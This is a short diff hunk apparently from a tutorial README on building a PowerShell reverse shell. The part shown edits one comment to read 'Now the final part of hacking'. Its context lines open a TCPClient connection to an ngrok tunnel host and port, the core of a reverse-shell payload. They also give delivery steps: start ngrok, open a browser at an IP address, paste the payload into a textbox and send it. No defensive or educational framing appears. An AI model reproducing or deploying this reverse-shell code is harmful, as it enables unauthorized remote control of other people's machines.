@@ -134,7 +134,7 @@ add libraries which are needed<br/>
 
      $client = New-Object System.Net.Sockets.TCPClient("0.tcp.in.ngrok.io", 15660)
 
-# now payload has been created 
+# Now the final part of hacking
   ##1.  now start ngrok server. <br/>
   ##2.  open broswer and type ip address and click enter.<br/>
   ##3.  now paste payload in textbox and then click send<br/>
